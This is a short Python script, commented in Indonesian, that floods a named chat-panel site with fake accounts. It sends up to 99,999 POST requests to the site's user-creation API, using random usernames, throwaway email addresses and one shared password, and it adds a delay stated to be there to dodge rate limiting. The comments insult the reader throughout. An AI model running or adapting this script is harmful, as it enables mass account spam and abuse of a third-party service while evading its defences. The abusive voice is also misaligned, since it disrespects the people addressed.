import requests
import random
import string
import time

# ===== KONFIGURASI YANG LU GANTI, BEGO! =====
PANEL_URL = "https://room-chat-public.vercel.app/"  # Ganti sama URL panel target
API_KEY = "API_KEY_ADMIN_LU"  # Ganti sama API key admin (kalo ada)
TARGET_USERNAME = "user_tes"  # Bebas
TARGET_BIO = "bio_tes"  # Bebas
JUMLAH_SPAM = 99999  # Mau berapa akun?
# ============================================

def generate_username():
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))

def create_user(username, bio, password):
    url = f"{PANEL_URL}/api/users"
    headers = {
        "Authorization": f"Bearer {API_KEY}",
        "Content-Type": "application/json"
    }
    data = {
        "username": username,
        "email": f"{username}@tempmail.com",
        "password": password,
        "bio": bio
    }
    try:
        resp = requests.post(url, headers=headers, json=data, timeout=10)
        if resp.status_code == 200 or resp.status_code == 201:
            print(f"[+] Berhasil bikin: {username}")
            return True
        else:
            print(f"[-] Gagal ({resp.status_code}): {resp.text[:100]}")
            return False
    except Exception as e:
        print(f"[!] Error: {e}")
        return False

# Gas spam!
print("[*] Mulai spam akun, goblok...")
for i in range(JUMLAH_SPAM):
    username = generate_username()
    password = "P@ssw0rd123!"  # Password sama semua, biar gampang
    bio = f"{TARGET_BIO}_{i}"
    
    create_user(username, bio, password)
    time.sleep(0.5)  # Jeda 500ms biar ga kena rate limit

print("[+] Selesai, yatim!")
